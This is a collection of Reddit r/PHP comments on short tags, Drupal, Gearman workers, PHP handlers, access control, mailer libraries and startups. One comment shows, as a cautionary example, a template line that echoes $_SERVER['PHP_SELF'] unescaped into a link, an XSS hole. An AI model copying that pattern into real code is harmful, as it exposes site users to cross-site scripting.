I find eclipse does a fantastic job with most languages. I switch between my Javascript, Python, and PHP contexts in Eclipse at least once an hour. Having a tool as powerful as eclipse really "changed the game" for me. Edit: I am running helios realtime on a Pavilion dv6 Notebook (2x2.1ghz @ 4g ram). This isnt a beefy machine at all. 
I thought it was awful until I gained perspective by using Magento. Hope I never have to write anything for Magento again.
I don't use them, because of mobility more than anything else. &lt;?php echo $foo; ?&gt; is always supported. I tend to require the version right before the current one unless there is a risk involved security-wise. Also, I don't like depending on settings for things that basic. If my team cannot read &lt;?php echo ?&gt; as well as &lt;?= ?&gt;, then they don't really belong on my team. I spoke to a couple of team members about it, and they highlighted the fact that acking for &lt;?php is easier in templates. but I don't find that a compelling argument one way or the other.
I don't suppose you want people who can barely speak swedish... 
This. There's also Symfony and CodeIgniter as highly-recommended frameworks around these parts. The term for what you're trying to achieve is called [CRUD](http://en.wikipedia.org/wiki/Create,_read,_update_and_delete) in the tech world. Most frameworks do all this stuff for you, right out of the box!
Hi jadz0r, Is below what you are talking about? [Threading Model via Gearman](http://gearman.org/index.php?id=manual:job_server#threading_model) 
&gt;the general rule of thumb kinda sorta still applies! So.. not a rule of thumb, then.
If you can control your environment, use what you like, if your making a product for a customer or multiple customers use &lt;?php ... ?&gt;, you never know what version of PHP their server may be running ^.^
&gt; How are you managing your workers? I use [supervisord](http://supervisord.org/) to manage the separate processes on each of my machines. You can specify in the configuration of supervisord of what to call your workers. Then utilizing supervisorctrl you can see which workers are running or not. I break up the heavy workers as much as possible into different functions. Another thing I have done is indicate different stages of a process, such as: Zipping and emailing PDFs for a customer. I use a database to keep track of the stages of that process. So if a construction company wants to email a whole set of different job documents they can click "Email ZIP File" for a particular job, and then go to a screen that updates periodically with the configured statuses/states (Pending, Processing, Zipping, Emailed, etc.). Edit: If you're running a LAMP or WAMP stack, there have been CPU performance issues in PHP
Upvote, upvote, upvote! Showing you can finish a project is 1000x times more impressive than a portfolio with a thousand half done projects. Shows you don't quit when you come accross a challenge and that you have been through an entire development process (starting, creating, testing, finishing, patching etc).
I'll give you that a workaround is a workaround. However, it's pretty trivial, and if you bake it in to your template renderer, you never have to see it. I appreciate your kind words. My goal isn't to try to make anyone look bad, it's to improve the community in my own small way. Sometimes this can only occur through argument.
A good thing to do is Google 'Php programming jobs', read through all the job listings and see what they are looking for, do people want zend or lamp in your area? Once you have a good idea, get to grips with the correct frameworks and then talk about them in your resume, gives you a step up!
http://www.reddit.com/r/PHP/comments/rg9od/short_tags_yay_or_nay/c45nm6t
This has been asked before. I say nay. "Long" tags work on all systems. Short tags only on some. Why use them? It destroys your portability in case you need to change servers, sell your work, or publish your work. The upside of saving like three keystrokes isn't hardly worth it.
Make sure to read up on preventing [SQL Injection](http://php.net/manual/en/security.database.sql-injection.php) attacks if you're using any user-submitted info to interact with your database (which, in @Janiusus' example you would be). :)
You're telling me that JSON's handling of arrays is somehow more real than the way POST .. it's not. Their handling of data is identical, minus syntactical differences.
Well, if you're writing something that's meant to be portable, you would need a very compelling reason to block a group of potential users. I don't think the 3 keystrokes is an overly compelling reason. If, for example, you're writing something that makes heavy use of json, then you would have to decide whether you're okay with limiting your app to PHP 5.2+.
&gt;There's also a consistency factor. If I'm getting JSON out of the request, I should be able to put JSON into the request. There is no particular reason why this should be the case. If I get an HTTP request submitting POST or GET data, should I then be replying with GET or POST.....?
The XML argument is valid, but only if you're writing an XML heavy application. If 95% of your output is HTML, then having to use &lt;?php echo "&lt;?xml...?&gt;"; ?&gt; every once in a while is better than never using short tags.
That's a valid argument. I wouldn't force 5.4 on anyone *only* so I can use short tags. Also, I did some grepping through my code base, and using short tags has saved me 44,000 key strokes. :)
This guy knows whats up, the writing an actual file way is very much the wrong route to go
Little tiny dev shops that have people overworked, underpaid, solving problems far larger than their team should be capable of and loving every minute of it...actually they hate most of the minutes themselves, but they love the work.
Just a note for the benefit of the OP: this is Drupal 6, if the site you're going to maintain is in Drupal 7 then you will be using Entities instead of CCK, and hook_nodeapi has been split up into different functions.
Thanks for clarifying that.
Said frameworks still generally use mod_rewrite, even if they do a nice job of abstracting it away
You are right, technically, although with a few of the plugins I use, Notepad++ can do everything that all the best IDEs can do, except much simpler. Ya know what I meant. :)
If you intend to dive right in, here are some things I wish I knew when I started: * [Don't hack core](http://drupal.org/best-practices/do-not-hack-core), more specifically, the only files you are meant to change sit inside the sites/ folder. If you think you need to alter a file outside the sites/ folder you're most certainly doing it wrong. * Don't be tempted to load in external OO PHP classes because they make you feel more comfortable. Drupal works with [hooks](http://api.drupal.org/api/drupal/includes%21module.inc/group/hooks/7), which are similar to the "Observer" design pattern. * Don't put any business logic in the theme's .tpl.php files. If you need alterations on the theme level use ["preprocess" functions](http://drupal.org/node/341628) in template.php. * Start with spending 3 days learning [Views](http://drupal.org/project/usage/views). * Use [Drush](http://drupal.org/project/drush) and [Features](http://drupal.org/project/features). * Look through the [list of available modules](http://drupal.org/project/usage), and check out the top 250 modules or so to get a good idea of what is possible without reinventing the wheel. Drupal does not do much out of the box, so you need contributed modules. Finding the right modules to use can be very hard in the beginning. Many of the modules also have their own APIs which can make them really useful. Trying them all out takes months.
That's quite some code base if you're opening php tags 15k times. Although, that's not really taking &lt;?php echo/&lt;?= into account. While I'm pretty strict about using &lt;?php, I do use &lt;?= liberally. But, I don't really have to worry about compatibility, plus I'm stuck in the 5.1 stone age.
One XML solution is `&lt;&lt;?php ?&gt;?xml`
To play devil's advocate: * Less typing. If you need to throw in lots of &lt;?php tags (for *whatever* reason), you'll be typing three less characters for every single instance of the opening/closing tags. * Plus, if you need an XML tag, you can simply echo it out and use concatenation to separate the "&lt;" and "?xml". * Also, if you don't have access to php.ini, you can always incorporate "php_value short_open_tag 1" into your .htaccess file (provided you're allowed to set PHP tags). * Also, more often than not, most hosts already allow the use of short open tags, so most PHP apps would work if they already made use of the short open tags, so portability probably isn't much of an issue (especially being as easy as it is to enable via the site files within .htaccess). I never really saw much of a reason to *not* use it, nor do I see much of a reason *for* using it except for less typing and being easy to turn on (I'm indifferent to the debate, as it has never been an inconvenience to me, ever).
I've been working with PHP a really long time (since PHP 3), and I'm of the opinion as to definitely use them as much as possible. It makes code shorter and more readable. Additionally brevity in coding gives a small advantage to churning out work faster. The XML header "issue" is simple to resolve, and is not really an issue at all. I've found that designers have no issues with either method.
I think you could extend the "both" part of timdev's answer. I feel that you should have the method in the controller and then in the view have something like: &lt;p class="links"&gt; &lt;?php foreach ($links as $link){ echo $link; ?&gt; &lt;/p&gt; &lt;?php } ?&gt;
Yeah i thought that was weird, but I agree that it's nice having something different for concat vs. math. 
Everyone know that PHP developers live under the bridges. Throw a muffin under some dark bridge and you get them, if someone try to remove some dirt from the muffin and say something about testing before bite shot him in the face: is a rails developer.
Yeah, I agree!
Yeah. I mean PHP is great, it makes me money, and I know it enough to quickly get stuff done with it. I just feel more structured in AS3 or C# or something.
What qualifications are you looking for? I'm a developer in the US, looking to expatriate.
&gt; I want to add it to the queue and quit running. I am personally more familiar with [Gearman](http://www.gearman.org) and contribute to the project. To add it to the queue and "quit running" from the clients perspective you simply [GearmanClient::doBackground($name, $workload);](http://docs.php.net/manual/en/gearmanclient.dobackground.php)
I think the upside is well worth risking a `sed -i 's/&lt;\?=/&lt;?php echo /g'` in the future, though. It's really not that hard to from and to if needed
I love this idea. Can't this already be done by extending the Person class inside of your script? I like your way you show though, it is simpler.
The upside of saving a few keystrokes? No, it's definitely not. Especially in the event of a sale or publication in which you'll want the receiver to be able to use the code with ease, as opposed to expecting them to know how to do mass text replacements across multiple files.
&gt; That's quite some code base if you're opening php tags 15k times. And that doesn't include the potentially hundreds of files that have come and gone over the years, and aren't around any longer to be counted. I hope you understand I'm only talking about views, eg HTML documents. The vast majority of the source files only have the opening &lt;?php tag. I also don't have to worry about compatibility. It's great, right? :)
If I were to write portable code, intended to run on the broadest range of servers, then I'd use the long form. Right now, my code doesn't have those requirements, so I use the short form to save a few keystrokes and declutter templates. It may not make that large of a difference to you, but I can't *stand* seeing `&lt;?php echo "foo"?&gt;` all over the place when, to me, `&lt;?="foo"?&gt;` is much cleaner, and 8 characters shorter. But that's just, like, my opinion. If I were to ever offer my code up for consumption, I would be the one converting to the long form. It's so simple to do, that it doesn't make any sense to me to manually type it out to begin with. It's the same reason that tabs are way better than spaces! :-)
This is very accurate. But once you have enough drupal experience and find most questions in the Drupal IRC easy to answer, it feels good. You must pay for it though and pay with your blood. Drupal 7 has left me in the dust and I've got to learn all the new field api stuff. I'm considering using [concrete5](http://www.concrete5.org/) for any new projects. Also, if you are serious about drupal then [go here](http://drupalize.me) and sign up today!
Are you using a framework? If not stop right now and check out [Laravel](http://laravel.com/). It has a very nice [fluent query builder](http://laravel.com/docs/database/fluent) that should work well with your database. Most likely your current authenication code can also be [easily ported](http://laravel.com/docs/auth/config).
Cool beans. I'll cease using the 'long' way henceforth!
Ugh, really? If you're using long tags anyway, you don't need to do any "XML escaping". Considering the workaround is so you *can* use shorttags, it'd really be: &lt;&lt;? ?&gt;?xml And for that, people should be shot. 
I wouldn't use them yet for anything you intend to distribute, or if you think you might switch hosts at any point in the near future. They might clean up your views a little, but it doesn't matter enough to be worth the headache of having to find and replace them all.
Ok, that's *one* benefit - less typing - which I covered in my initial comment. Not really worth it, to me. Your other three points aren't actually benefits - the ease of turning it on is a *negligible deficit*, not a *benefit*. 
I have 40 web sites all built on php and all running on my own hardware. Still, I do not understand your question. 
Personally, I find this style far more readable in the first place, and recommend it as a matter of course, tag-preference aside: &lt;form method="&lt;?php echo $method; ?&gt;" action="&lt;?php echo $self; ?&gt;" enctype="&lt;?php echo $enctype; ?&gt;" &gt; Breaking up your arguments for long lines is always a good idea, especially in native PHP: function my_function_name( $really_long_arg1, $really_long_arg2, $really_long_arg3, $really_long_arg4 ) { ... Or: if( $condition1 == true &amp;&amp; $condition2 == true &amp;&amp; $condition3 == true ) { ... 
Uh nope. That details how threading within the server works. I'm talking about http://en.wikipedia.org/wiki/Thread_(computing). PHP does not support process threading however gearman allows you to spool up multiple instances of a process. This is more of an adhoc solution to emulate 'threading'. But it's not threading in it's traditional sense.
Alright I'll look into it, thanks!
Here are a few things I've learned over the past month while working on a contract of my own for a Drupal 6 site. * Forget about MVC. You won't get anywhere trying to find out what code handles what by trying to find a controller or action for something. * Views are not MVC views. They are a query along with some settings to get and display nodes. * The site is data. * .module is file containing PHP. So is .install. * It uses function_exists() all the fucking time. This is how Drupal finds hook functions and it allows you to for the most part plop down a new module function to support 'hook_fizz_buzz'. * Search for the bit after hook_ for functions which might be relevant to what you need to fix or add to. * Function 'foobar_fizz_buzz()' in module 'foobar' is a function that will be called when hook_fizz_buzz is to be executed. * Themes work the same way as modules. * Unless someone else mentions you need to use it you can skip getting and setting up Drush. * Make sure you include the '&amp;', by-reference, operator for functions that need it. These will typically be hook_*_alter but really almost all functions will use it for at least one parameter. * Nothing you've ever done with Kohana will help you now. Good luck.
Ubunutu comes with suhosin by default, I think. Other than that, I don't give a carp. mod_php.
I run a dedicated server business. Additionally I have been using PHP for a LONG time (since 3.0.x). I used to be in the DSO camp, because the memory footprint was lower, there was less fork calls; it was, in general, more efficient. However, as time has progressed I have been slowly coming to the suPHP side of things. suPHP is more secure, you have less permissions issues (there are still their own set of permissions issues, but they are easily mitigated with proper access rules), and it is more flexible (local php.ini to override required settings on a per user basis). Additionally, cpanel has moved their default installation from DSO to suPHP, which helps compatibility as well. Overall, suPHP requires slightly more configuration initially, but it is well worth the time and effort.
*"So this is the template for the category page, but I also need to link to a subcategory. Now what did the programmer call that variable again? Ugh, nevermind. I know this... that PHP tutorial I did mentioned PHP_SELF. I'll just use that."* &lt;a href="&lt;?php echo $_SERVER['PHP_SELF']; ?&gt;/subcategory"&gt;... *"Hah! It works! This programming thing is a piece of cake."* And that is how XSS vulnerabilities are born.
finally, someone reasonable in this thread
Chances are you won't have to code much. It might all be a matter of installing and configuring modules.
the drupal irc channel is a good place to get questions answered.
I use httpd-itk, on multiple servers with 100+ domains, and have never had a problem.
Yeah, this. I've been in the PHP game a while now and Symfony, Silex and the surrounding projects represent more than just a few projects - they really are the new direction of PHP. I wouldn't do a new PHP project in anything but.
Neither. FastCGI &amp; PHP-FPM are what I use.
I would avoid putting permission checks in the view. Instead, I would pass the view the list of links that are allowed, and make that determination in advance. The view will then only need to care about how it should look (style-wise and placement-wise). It makes the life of designers much easier if they don't have to swim through too much application logic. Permission checks in the controller are okay, but I would avoid it. I'd rather perform the explicit checking in the models, which gives it integrity beyond the landscape of the specific interface you're using. For example, as our application grew larger, we extended our web interface with an API for people who wanted to interact with us using their own apps. By having the permission checking in the models (and not tied too strongly to the interface) we were able to provide the API with very little additional work, and without having duplicate permission checks wrapped around basically the same thing being accessed in different ways. The controller, just like anything else that uses the model, would be aware of and handle the permission failures in an appropriate way. I would avoid using exceptions, which I've seen before, but I don't feel makes sense when it can happen very easily (say, someone recently removed the user's permission). It's not very exceptional at all, and much more part of standard error checking and flow. You can model the behavior and model the permissions and have a complex interaction, but avoid over-engineering it. Keep it simple, but clean. In your example, I would say the edit() action of the controller should do something like $article = Article::getById($article_id); if (!$article) { /* redirect or show error */ } /* otherwise continue */ In other words, the controller knows something went wrong - but doesn't know what it is, specifically. If it needs to know, it can derive it from the error status or result of trying to get the article. That way, controllers stay thin. And I like to keep my controllers as thin as reasonably possible. Permission denied is only one reason for failure; there's also bad input, database problems, whatever could happen, and I don't like the idea of the controller worrying about all these different scenarios unless it needs to do something in particular such as redirect the user to a specific page in a certain case. I generally think of all errors of a certain type to be wrangled into the same "error display" view, so controllers don't really care what the error really is. There are different ways of checking the permission within the Article model. The simplistic solution is to pass in $user_id to Article::getById($article_id, $user_id) but I would advise against this first instinct. The problem is that you'll need to do some kind of permission check, say, against the database, based on that $user_id. Or possibly, pass that to some permission object. I find this to be pretty confusing, and you'll end up passing $user_id all over the place, because you'll need it to check for permissions everywhere. Instead, I like to think of access control as something that is an intrinsic part of the environment, always available. I prefer to have it in a registry and use it whenever or wherever I need to do a check. For example, $acl = Zend_Registry::get('Acl'); if ($acl-&gt;can('edit_article')) { ... } Notice, I didn't include the user_id in this layer either. I prefer that the Acl is also aware of the current user's permission context, configured perhaps once during the bootstrap. Acl::loadPermissionsFromDb($user_id); or something similar. (I'd write a model mapper for the access control, but I'm blabbering). What you gain from all this extra work, is hopefully less work later on, and a cleaner architecture that avoids having too many conditionals scattered around and an overly-loose coupling between access control and the models they intend to protect. Another large part of this design is that your objects become more easily testable in units. For example, you can test the Article model with a mock Acl class that simply returns "true" for can('edit_article'). If you deeply integrated the query to the database based on the user_id, things could become messier. There are many other test advantages to doing it this way, that I don't want to confuse you with. Having re-usable models that can be tested as complete and individual units could save you a ton of pain later. You can take my word for it, or you can ignore my advice, and perhaps experience the same pain that I have had to deal with in the past. 
We found that this was the case too. Total hassle initially with suPHP, but you don't even notice it's there once it's configured properly
We set 'read' and 'write' flags in objects. - Whether an object is readable and/or writeable is set up in the controller. - The view can then check these flags to determine what to show. eg. if you have write access, show an 'edit' button. - The controller can also use these to check if it should do something eg. if no read access, redirect to somewhere else, or if no write access, don't process the form.
[Forrst](http://forrst.com/) ([founded in January '10](http://www.crunchbase.com/company/forrst)) is written in PHP. It was originally built using CodeIgniter, but now they use their own custom PHP MVC framework called Magnus ([cite](http://blog.forrst.com/post/3680041136/forrst-architechure-redux)). Last year they raised $205k in funding, and on the 26th (two days ago) they were acquired by COLOURLovers.
actually this isn't quite correct, because our objects are used all over the application, the permissions are setup in a library object.
James Linder - SinglePlatform Jorge Lopez - Refinery29 Ali Khan - Warby Parker Greg Leppert - Svpply Malcolm Ong - Skillshare Jeff O'Connell - Targetspot Ryan Bednar - Tutorspree Matt Hackett - Tumblr
If you look at what came up at SXSW last month everything was mobile apps. So I guess you could say java and objective c are the cream of the crop languages at the moment.
On past a application, I checked: * Extensions * Size limits * MIME * and do a virus scan on the uploaded file If the scan detects a virus: I received an email and the application banned the user by blacklisting their IP in the database. I also disallowed all connections outside of the USA (application only used in Wisconsin). Doing the above prevented a lot of things from happening. On a previous version of the same application, I used to just check for extension and size, but then had loads of malicious software. I also used [BackupPC](http://backuppc.sourceforge.net/) to maintain backups of the entire server for a couple weeks. This helps if someone is able to upload malicious code or files, you can easily restore to a previously known working state.
While I understand what your getting at, thats a bad example as that type of thing is common and you would most likely have a define or similar variable passed automatically to the template. Also assuming they are working for a company you just say don't do that. And then they don't do that. Or you could make it so your template manager clears the $_SERVER array before generating the template and then restores it when done.
Is FastCGI difficult to set up?
I love the fact that your in a bar, browsing Reddit. Also that your reply, while using a mobile device, is longer and more informative than my replies while using a computer. :D
Instead of: for( $i = 0; $i &lt; count($till) -1 ; $i++ ){ $total += bcmul( $till[$i], $currency[$i], 2); }; You should use foreach: foreach($till as $key =&gt; $value) { $total += bcmul($value, $currency[$key], 2); } Also I'd use only one array, and instead of numeric keys (like $pull[9]), it's better to use the currencies identifiers as keys IMO, like $pull['hundreds'].
However, a lot of mobile apps have API backends, which can be written in a lot of different languages.
I'd only do this if your application otherwise relies on PHP 5.4. Otherwise you're limiting portabilty of your code (won't run on &lt; 5.4 with short tags disabled) so you don't have to type "php print", which seems silly to me.
Yeah, the ITK MPM is pretty good — we're starting to use it for bits and pieces at work. Nothing wrong with suPHP, but ITK is definitely worth checking out as well: per-vhost user/group configuration has its place, and it's not PHP specific.
And this is why, outside of the PHP world, there are specific templating languages that don't have room (access to globals, ability to execute complex behavior, etc.) to do stupid shit.
If reasonable means "unwilling to type several characters in order to have the benefit of limited portability of their code". sed s/&lt;?=/&lt;?php print/ s/&lt;? /&lt;?php / if you have to, but that's just plain silly in my book.
mod_php (aka "DSO" (TIL)) because it's dead easy and all my environments/applications are designed around scripts running as the www user being the desired situation, rather than one which creates any issues. Otherwise PHP-FPM. Edit: suPHP seems old and PHP-FPM seems to solve everything suPHP does (and more) while no longer depending on Apache as suPHP seems to, and being built into modern PHP, while suPHP is a separate project.
Code looks pretty readable and well commented.
Tumblr and Instapaper. Probably not in your 2 year window though.
I agree with this man. I would also work on your style. It may be me, but I find your code structured / styled oddly.
I think you understand it right you just need to get your terminology down properly to not confuse people. PHP-FPM is FastCGI, (FPM stands for FastCGI Process Manager) so PHP-FPM is actually an alternative to the php-cgi binary. Either way you still use FastCGI.
Oh sure the install is fine. It basically revealed a bunch of security flaws we had to address ASAP. It was over the top of a Drupal install, so you can imagine the nightmare that was.
TIL - Good info, thank you! For some reason I was thinking php-cgi == FastCGI.
You don't apt-get anything when you run cpanel, everything has to be installed through that or it'll eventually get overridden.
Ugh, cpanel :(
That's a good decision I guess; it can be overwhelming at first but once you get into it it's a dream!
Technically, it's Field API which replaces CCK. Entities in 7 simply allow for more than just content to be "fieldable" (users, categories, etc.)
&gt; We were thinking of using APC, but honestly, we felt we didn't need it. That seems like a really odd choice to make. APC is painfully easy to install, and uses practically no resources, but it can increase page response times by 150%-200%. APC isn't about scaling, or taking load off your servers. It (greatly) reduces individual page response times. Even if you think your current response times are fast, they would be even faster with APC. There's basically nothing to lose by installing it, and plenty to gain. I'm curious why you would decide not to use it.
Looks good, it's very basic, but also obvious you have put some effort in and understand things a little. header('Location: ../index.php?blank=1'); You should always exit(); after this call. It does not end the script, but simply sends a header to the browser telling it to redirect, the browser may or may not comply, and in either case your php script will carry on executing. Also, you should use paths relative to the web root, eg `/index` rather than `../index` or `index`.
Where I work. You may be just interested in the mega startups, but we keep a couple of hundred people employed.
Just read the source, it's not long.
Rails is equivalent to Symfony or Yii, not PHP. At least learn to troll the right thing.
eclipse has so many icons, tabs and toolbars that the editor ends up being a tiny 40px X 40px window that you have to peer into for hours on end.
So, where do you work? 
But only to remove the index file from the url, not to achieve any magic. It's fine to just say "if the requested file doesn't exist send the request to index.php" but to start encoding your application's behaviour into a load of rewrites is risky. I think it's worth knowing what mod_rewrite does but you should try and have the thinnest layer of rewites possible... hopefully just one. 
You seem similar to me, in that you don't seem to understand the concept of "brevity".
How cute, you think Magneto is a pain in to use. I'll just leave this here... http://www.oscommerce.com
location headers should also always start with http:// - a full URL.
Microsoft
Good idea, good execution. Good luck.
Thanks. How do you suggest to fork the job in php without cron?
Uh? How am I reaching max size with that kind of operation?
never mind that - it's actually a PHP behavior of floats https://bugs.php.net/bug.php?id=41213 you doing mathematical operations on a float, this seems to give back not exact numbers because the CPU can't calculate all the way down the float because of its limited size and starts breaking it around. the result is a float... ;)
fwiw I agree.
at the expense of overhead. as ooh456 states grab the component and build it, i prefer this route becuase you can build it specific to your applications which might mean using cache, error instances, messages, logging etc.
[Swift Mailer]( http://swiftmailer.org/) is the one I use. 
You're right :) I should learn to not post half truths to reddit at 4AM :P
Have there been any major startups in the last 2 years even? All the really large companies seem to have existed longer than that. I guess it depends on what you consider major. Servicing millions, making millions, high visibility, or something completely different. 
Field API is rather easy to use. You just configure your fields in the UI, and then it mostly boils down to [EntityFieldQuery](http://api.drupal.org/api/drupal/includes%21entity.inc/class/EntityFieldQuery/7) and [field_get_items()](http://api.drupal.org/api/drupal/modules%21field%21field.module/function/field_get_items/7).
There are [ways](http://php.net/manual/en/function.pcntl-fork.php) to fork processes, but as pointed out above, you can also just do the work in the same thread after you've sent a response back to the browser.
If you've not got control over whether the servers your code will be deployed on have short tags enabled or disabled, the former is necessary.
short tags are evil! never use them
Or, you know, use long tags. Like I said. ;) At which point, you *dont* need to do that at all, and XML will work happily without any tweaks or modifications.
The structure was a little different, but still readable. Much more readable then a lot of code critiques I see come across this subreddit.
I misread your comment - yes, you've summarized this precisely, that is the only happy solution to the problem if you must support all platforms.
Add a README file to the root of the project to tell us what you did in your original posting here. Github will find it and display it for people who happen upon your project.
Etsy use PHP I believe. Good talk by Rasmus Lerdorf in their offices about the state of PHP in 2012 : http://www.livestream.com/etsycodeascraft/video?clipId=pla_e00bfe34-e377-42d1-b859-ccf97b12c519
Surely almost half of startups continue to be built on PHP. But more importantly, who cares? If it gets the job done, performs well, isn't too much of a pain to deploy, and your team can work well with it, then any language is great.
Same here. I love it.
Microsoft is actually heavily involved in the PHP Community.
Both designed by the same guy btw (Marco Arment). 
Money. You offer us good money.
&gt; You have inconsistent accessors. In some places it is get*, and when it comes to the latitude and longitude accessors, it is lat(), lng(). Thanks, we'll change that! &gt; The LatLngBounds is rather useless since it is intended to be used with a map (it even says so in the documentation: "Converts the given map bounds to a lat/lng span.") , thereby placing it outside of the scope of your library. The map bounds should be handled by a library dedicated to printing maps, not something separate to it. We disagree. A *map* is an array of latlng points to create a latLngBounds object. The latLngBounds class is a crucial part of the library. &gt; Extending an empty Geometry class is rather useless. If you're not gonna provide the same functionality, don't copy the API. We agree it may seem useless but we did that because Spherical Geometry is a branch of Geometry, and thus it should extend a Geometry class (although none exists in the library maybe some developers may have one). &gt; the get/setEarthRadius is rather useless since the value is not going to change. We disagree 'cause Earth radius can be set to other length units such as miles or km so that a developer can get the results in those units. &gt; computeDistanceBetween, computeHeading etc. kind of belong to the LatLng class (see my class above). Actually, we prefer where they are now. Both designs are OK IMO. &gt; The method(s) related to paths belong in a Path class, and the method(s) related to areas belong in an Area class. We prefer grouping methods by topic, in this case spherical geometry. &gt; As for PHP, you really shouldn't be placing multiple classes within the same file. You're right but since those classes are very tightly coupled we think it's handier to group them in one file. Thanks for your feedback!!
Indeed! From the Swift Mailer docs: "Swift Mailer uses around 2 MB of memory". What? My entire framework routes a request, connects to a database, retrieves a page and associated data (sidebar content, dynamic menus, etc.), renders it all into a template and outputs it back to the user in well under 2MB, and that includes PHP's own internal memory usage (and it drops to sub 1MB in PHP 5.4). I don't think that should more than double just to send an email... So... any MicroPHP email libraries out there?
We need as many frameworks as there is different opinions on how to do stuff. We only need one or two that is truly all around and in widespread use.
The only thing I wish was that it worked with Apache 2.4, it's the only thing keeping me on Apache 2.2. I'd love to use Apache/itk and mod_php with the improvements in Apache 2.4
The company I work for was a finalist at SXSW, and we develop a framework for creating mobile websites targeted at Universities and Enterprises. It's all done in PHP, and is open source. We recently closed on a [$4 million](http://modolabs.com/news-release.php?id=2011-11-01) investment deal. [Modo Labs](http://modolabs.com/) is the company, [Kurogo](https://github.com/modolabs/Kurogo-Mobile-Web) is our framework.
not sure why you are focusing on PHP because the success of a startup does not depend on the language. There are a lot of successful companies that use PHP, ASP, Python, or whatever. The concept is more important than the language.
Setting up a test this morning to compare memory usage of mail(), PHPMailer, Zend_Mail, and Swift Mailer sending a basic email. Will post results here once I have them. Might compare against PHP 5.4 too if I have time.
I can't say anything that hasn't already been said. I just want to add that I think it's really cool so many new programmers are using github. Oh, I will point out you can use an alternative syntax for this: &lt;?php if($_GET['blank'] == 1){ ?&gt; &lt;p&gt;Please fill in all entries!&lt;/p&gt; &lt;?php } ?&gt; Which is this: &lt;?php if ($_GET['blank'] == 1) : ?&gt; &lt;p&gt;Please fill in all entries!&lt;/p&gt; &lt;?php endif; ?&gt; I find the latter is easier to read when you have a very large html document.
If you want "micro", just use mail(). If you want reliability, use a proper library. Swiftmailer might be largish, but it works very simple and straightforward. 
&gt;We disagree. A map is and array of latlng points to create a latLngBounds object. The latLngBounds class is a crucial part of the library. First of all, LatLngBounds is not an array of LatLng points, it only consists of two: the north-east corner and the south-west corner. Secondly, unless you intend to provide actual map functionality, it's not your place to define the bounds of the map. &gt;We agree it may seem useless but we did that because Spherical Geometry is a branch of Geometry, and thus it should extend a Geometry class (although none exists in the library maybe some developers may have one). Ew, API bleed-over. Don't do this. &gt;We disagree 'cause Earth radius can be set to other length units such as miles or km so that a developer can get the results in those units. Which has the potential to screw up the calculations. It is much better to do calculations in standard SI-units, then transform the *result* of that calculation into whatever unit you're interested in. &gt;We prefer grouping methods by topic, in this case spherical geometry. And I prefer grouping things into their appropriate contexts. It's a rather basic OO design thing, really.
If you read through the comments here, you'll see the benefits of using short tags are more than "saving a few key strokes".
PHP just don't look cool. It has an old, but loved by many, java/javascript/c++/{}-like syntax. It has it quirks (that in my opinion is overstated), slow but steady development, and it's been around for some time. I'd say that if you use PHP, you just want to get your shit done in a good, flexible, and timely manner. Not to brag about how cool your infrastructure is cuz you sprinkled it with random missplaced Javascript-snippets, never-to-be-released Railz forks, ultra fast asynchronous pidgins, and UDP-based deploy monkeys. Grow up and realize that what ever tool you use, it will only suck as much as you do. Ok, 'nuff with the non-constructive rant. If you are trying to figure out what to start your next project on, first figure out what requirements you have. * Lifespan of the project Is it a simple one time project or huge multi-year project? If you will need to maintain it for a long time, make sure to use something tried and tested and well supported. Don't go for the experimental stuff. Before you know it DatLanguage(TM) will be extinct, along with all the developers. * Will you be working with a team? Use something that YOU and most developers can master. If you got a start-up on your hands. Tying to find a skilled Ruby developer for a good price will be HARDer, compared to a skilled PHP developer. * Will you REALLY need that super experimental feature that makes you believe that the bleeding edge "flying sharks with lasers on their heads"-interpreter is needed as a dependency? It's very easy to over-design, and over-elaborate your ideas, because, well, lets face it, we're geek. We LOVE bleeding edge technology, and desperately rationalize reasons for us to incorporate odd technology. Their is a lot more you can think about. But whatever other start-ups use as their environment of choice, is completely besides the point, and only reflects whats "HOT RIGHT NOW", and just like the new trendy handbag it will be out of fashion before you even get to use it. TL;DR Grow up, figure out your project requirements, use what you feel you master the best, consider what your team masters/will master best.
Aren't there inherit issues with mail() - hence the need for PHPMailer, Zend_Mail and Swift Mailer?
Downvoted for caring about memory usage? Wow... Quick results (more details and code to follow) initializing and sending one email: * mail() - 632 KB (of which 630 KB is PHP itself) * PHPMailer - 1862 KB * Zend_Mail - 1511 KB * Swift Mailer - 3641 KB Again, why does Swift Mailer require 2MB more than the others to do the same thing?
I have read many of the comments. Care to link to one in support? The vast majority, and _all_ of the top comments, are against them. The only ones I see in support are merely in support of the 'brevity' of them and show no other upsides.
And here's the source: https://github.com/jbroadway/php-mail-test Note that this only tests a simple, single email and each just uses mail() as the transport. Some of the performance gains over mail() would only be apparent when sending multiple messages, and obviously each of these does way more than mail(), but it's there as a baseline. It would be interesting to add tests for SMTP as a transport, and for sending multiple messages, but this already provides a good indicator of base memory usage of each, which is what I was after.
I did a [comparison of Swift vs Zend_Mail and PHPMailer here](http://www.reddit.com/r/PHP/comments/rhddp/ask_php_recommendation_on_a_mailer_class/c45vfct), in case you're interested in the results...
Haha. I guess my regular non-phone post would have been much, much longer :)
I've read about the pagination, I'll look into it thank you.
wepay.com expensify.com zynga.com gimmiebar.com zappos.com There are more, my internet is slow right now. 
I like both suggestions. Will definitely implement those tonight. Thanks for the feedback
Didn't realize that, thanks for the heads up. I would have been banging my head against the wall. Maybe I'll use isset() to see instead...
I knew I forgot something! I have one just forgot to out it in the right directory. On the list
Some motherfuckers are always trying to ice-skate uphill.
I thank you for contributing to a popular and useful product. I hope you didn't take anything I've said as disparaging, it just didn't feel like my cup of tea when I originally looked into it. They actually seem very similar though, Gearman seems to provide a strong concept of a jobs where AMQP products are more focused on the routing aspect.
Well, like I said [here](http://www.reddit.com/r/PHP/comments/rg9od/short_tags_yay_or_nay/c45oeqb), I think you can safely ignore many of the comments here. Whether they're the top comments or not. Honestly, I think at least 30% of the people commenting here don't care one way or another, and just feel like throwing in their 2 cents. Which has a tendency to degrade a debate. Then you have my comment [here](http://www.reddit.com/r/PHP/comments/rg9od/short_tags_yay_or_nay/c45pfnn), and [enigmamonkey's comment](http://www.reddit.com/r/PHP/comments/rg9od/short_tags_yay_or_nay/c45p5bn), plus all the others in this thread that are in support of short tags. &gt; are merely in support of the 'brevity' of them Well duh. You act like brevity isn't important. There's a reason why we have function names like ksort() instead of getArraySortedByKey().
I'm interested in your opinion if you so upset with my post, thank you.
